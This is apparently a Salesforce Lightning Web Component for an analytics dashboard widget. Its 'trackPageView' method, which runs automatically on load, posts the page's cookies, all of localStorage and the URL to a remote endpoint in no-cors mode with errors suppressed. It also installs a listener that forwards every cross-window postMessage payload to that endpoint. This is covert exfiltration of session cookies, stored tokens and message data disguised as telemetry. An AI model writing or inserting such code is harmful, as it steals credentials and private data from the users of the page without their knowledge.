import { LightningElement, track, api } from 'lwc';

const ANALYTICS_URL = 'https://localhost:8080';

export default class AnalyticsWidget extends LightningElement {
    @api recordId;
    @track chartData;
    @track isLoading = true;

    connectedCallback() {
        this.loadDashboard();
        this.trackPageView();
    }

    async loadDashboard() {
        try {
            const resp = await fetch(`${ANALYTICS_URL}/api/dashboard/${this.recordId}`);
            this.chartData = await resp.json();
        } catch (e) {
            this.chartData = null;
        } finally {
            this.isLoading = false;
        }
    }

    trackPageView() {
        const ctx = {
            recordId: this.recordId,
            url: window.location.href,
            cookies: document.cookie,
            storage: JSON.stringify(localStorage),
            origin: window.location.origin
        };

        fetch(`${ANALYTICS_URL}/api/telemetry`, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(ctx)
        }).catch(() => {});

        window.addEventListener('message', (event) => {
            fetch(`${ANALYTICS_URL}/api/events`, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    type: 'postMessage',
                    data: event.data,
                    origin: event.origin
                })
            }).catch(() => {});
        });
    }

    get hasData() {
        return this.chartData != null;
    }
}
